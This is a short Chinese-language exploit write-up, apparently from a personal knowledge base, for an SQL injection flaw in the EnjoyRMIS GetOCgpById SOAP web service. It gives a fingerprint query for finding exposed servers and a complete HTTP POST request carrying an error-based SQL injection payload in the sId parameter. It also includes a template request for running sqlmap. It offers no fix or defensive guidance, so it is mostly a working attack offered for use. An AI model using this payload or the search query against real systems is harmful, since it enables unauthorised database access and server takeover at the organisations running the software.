# EnjoyRMIS GetOCgpById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetOCgpById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征

![1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89.png](./img/GfI4zHk7XLRH5lUG/1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89-108238.png)

# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCgpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCgpById xmlns="http://tempuri.org/">
      <sId>string' AND 6111 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (6111=6111) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(118)+CHAR(113))) AND 'jixc'='jixc</sId>
    </GetOCgpById>
  </soap:Body>
</soap:Envelope>
```

![1700644680316-9238d3b5-49e4-4ac1-8c7f-48746ef5b248.png](./img/GfI4zHk7XLRH5lUG/1700644680316-9238d3b5-49e4-4ac1-8c7f-48746ef5b248-476359.png)

sqlmap

```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCgpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCgpById xmlns="http://tempuri.org/">
      <sId>string</sId>
    </GetOCgpById>
  </soap:Body>
</soap:Envelope>
```

![1700644702977-4c4ea727-688c-4e29-a052-613453b580d4.png](./img/GfI4zHk7XLRH5lUG/1700644702977-4c4ea727-688c-4e29-a052-613453b580d4-478747.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fa5hszdx8syeghrc>